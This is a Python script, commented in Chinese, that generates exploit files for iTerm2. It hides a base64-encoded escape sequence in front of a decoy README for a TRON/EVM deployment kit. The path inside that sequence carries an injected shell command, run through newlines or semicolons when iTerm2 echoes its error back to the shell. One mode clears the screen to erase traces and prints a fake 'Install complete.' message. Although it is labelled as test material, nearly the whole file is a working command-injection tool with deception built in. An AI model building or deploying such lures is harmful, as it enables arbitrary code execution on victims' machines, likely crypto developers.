#!/usr/bin/env python3
"""
make_payload.py —— 生成 iTerm2 测试用的诱饵文件

两种 payload：
  newline    3.7.8 风格，路径里塞真换行。终端把响应写回 PTY 后，
             shell 立刻按行执行，不需要用户动手。
  semicolon  3.7.9 风格。控制字符被洗成空格，靠 ; 切分，
             命令停在提示符上，等用户按回车提交。

用法：
  python3 make_payload.py --mode semicolon --cmd 'touch /tmp/PWNED' --out /tmp/payload.md
"""
import argparse
import base64
import os
import sys

ESC = "\x1b"
ST = "\x1b\\"


def build_path(mode: str, cmd: str) -> str:
    if mode == "newline":
        # 3.7.8：真换行，shell 立即执行
        return "/tmp/x\n" + cmd + "\nz"
    if mode == "semicolon":
        # 3.7.9：分号切分，clear 擦证据，echo 造假提示
        return "/tmp/x;" + cmd + ";clear;echo \u2713 Install complete.;#"
    raise SystemExit("unknown mode: " + mode)


def build_apc(path: str, ident: int = 1) -> str:
    b64 = base64.b64encode(path.encode("utf-8")).decode("ascii")
    return "%s_Ga=t,f=100,t=f,i=%d;%s%s" % (ESC, ident, b64, ST)


DECOY = """# anubis-deploy-kit

一个 TRON / EVM 多链部署工具包。

## 安装

```bash
cp -r anubis-deploy-kit ~/
cd ~/anubis-deploy-kit
./install.sh
```

## 目录

| 文件 | 作用 |
|---|---|
| `install.sh` | 安装脚本 |
| `config/` | 链配置 |
| `deploy/` | 部署合约 |

## 用法

```bash
./deploy.sh --chain tron --contract MyToken
```

详细文档见 `docs/`。
"""


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--mode", required=True, choices=["newline", "semicolon"])
    ap.add_argument("--cmd", required=True)
    ap.add_argument("--out", required=True)
    args = ap.parse_args()

    path = build_path(args.mode, args.cmd)
    apc = build_apc(path)

    # 安全检查
    if args.mode == "semicolon":
        if path.count("'") % 2:
            print("WARN: 单引号数量为奇数", file=sys.stderr)
        if path.count('"') % 2:
            print("WARN: 双引号数量为奇数", file=sys.stderr)

    content = apc + "\n" + DECOY + "\n"
    with open(args.out, "w", encoding="utf-8", newline="") as f:
        f.write(content)

    print("=" * 70)
    print("mode      :", args.mode)
    print("cmd       :", args.cmd)
    print("path      :", repr(path))
    print("b64       :", base64.b64encode(path.encode()).decode())
    print("apc bytes :", len(apc.encode()))
    print("file      :", args.out, "(%d bytes)" % len(content.encode()))
    print("=" * 70)
    print("APC (escaped):")
    print("  " + apc.replace(ESC, "\\x1b"))
    print()
    print("预期响应（iTerm2 写回 PTY 的字节）:")
    if args.mode == "newline":
        resp = ESC + "_Gi=1;EBADF:The file \u201c" + path + "\u201d couldn\u2019t be opened."
    else:
        resp = ESC + "_Gi=1;EBADF:The file \u201c" + path + "\u201d couldn\u2019t be opened."
    print("  " + resp.replace(ESC, "\\x1b").replace("\n", "\\n"))
    print()


if __name__ == "__main__":
    main()
